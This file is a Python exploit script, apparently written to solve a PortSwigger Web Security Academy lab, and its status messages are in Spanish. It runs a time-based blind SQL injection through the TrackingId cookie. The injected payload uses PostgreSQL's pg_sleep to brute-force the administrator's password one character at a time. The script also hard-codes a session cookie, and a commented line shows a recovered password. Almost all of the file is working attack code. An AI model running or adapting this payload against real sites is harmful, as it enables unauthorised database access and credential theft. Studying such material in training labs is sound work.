#!/usr/bin/python3
from pwn import *
import requests
import signal
import time
import pdb
import sys
import string


def def_handler(sig, frame):
	print("\n\n[!] Saliendo ... \n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0ab600f104d144adc06f3cdf0084007e.web-security-academy.net"
characters = string.ascii_letters + string.digits


def makeRequest():
    
    password = ""
    
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Password")
    
    for position in range(1, 21):
        for character in characters:
                cookies = {
                        'TrackingId': "gPRaGnb5ptpIFWij'||(select case when substring(password,%d,1)='%s' then pg_sleep(2) else pg_sleep(0) end from users where username='administrator')--" % (position, character),
                        'session': 'kUe45ch3Q2K3panMXfVrjLrBFxIqwPby'
                }
                p1.status(cookies['TrackingId'])

                time_start = time.time()

                r = requests.get(main_url, cookies=cookies)

                time_end = time.time()
                if time_end - time_start > 2:
                    password += character
                    p2.status(password)
                    break

#print("My password was: c2fxff9rwefag2y4cvqz")
if __name__ == '__main__':

	makeRequest()
